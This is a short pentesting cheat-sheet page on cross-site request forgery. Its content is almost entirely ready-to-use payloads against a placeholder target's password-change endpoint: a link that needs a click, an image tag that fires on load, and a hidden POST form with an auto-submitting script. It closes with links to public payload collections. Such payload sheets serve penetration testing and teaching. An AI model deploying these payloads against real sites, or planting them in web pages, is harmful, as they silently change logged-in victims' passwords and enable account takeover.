---
icon: globe-pointer
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Cross Site Request Forgery (CSRF)

## Payloads

### GET

```html
<!-- Requires user interaction -->
<a href="http://<target>/changepasswd.php?pass=pass">Click Me</a>

<!-- No user interaction required -->
<img src="http://<target>/changepasswd.php?pass=pass">
```

### POST

```html
<form id="form" action="http://<target>/changepasswd.php" method="POST">
 <input name="pass" type="hidden" value="pass" />
 <input type="submit" value="Submit" />
</form>

<!-- Auto submit -->
<script>
 document.getElementById("form").submit();
</script>
```

## References

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)\
[https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
